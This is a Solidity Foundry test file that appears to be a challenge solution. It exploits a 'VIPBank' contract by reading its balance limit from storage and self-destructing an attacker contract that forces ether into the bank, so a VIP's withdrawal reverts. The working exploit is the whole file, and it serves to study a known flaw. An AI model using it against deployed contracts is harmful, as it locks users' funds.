// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./VIPBank.sol";

contract Attacker {
    constructor(address bank) payable {
        selfdestruct(payable(bank));
    }
}

contract VIPBankTest is Test {
    address public vipAccount = vm.addr(1);

    VIPBank internal _bank;

    function setUp() public {
        uint256 vipBalance = 0.025e18;
        deal(vipAccount, vipBalance);

        _bank = new VIPBank();
        _bank.addVIP(vipAccount);

        vm.startPrank(vipAccount);
        _bank.deposit{value: vipBalance}();
        vm.stopPrank();
    }

    function test_attack() public {
        uint256 maxETH = uint256(vm.load(address(_bank), bytes32(uint256(3))));
        uint256 needed = maxETH - address(_bank).balance + 1;
        uint256 vipBalance = _bank.balances(vipAccount);

        new Attacker{value: needed}(address(_bank));

        vm.expectRevert();

        vm.startPrank(vipAccount);
        _bank.withdraw(vipBalance);
        vm.stopPrank();
    }
}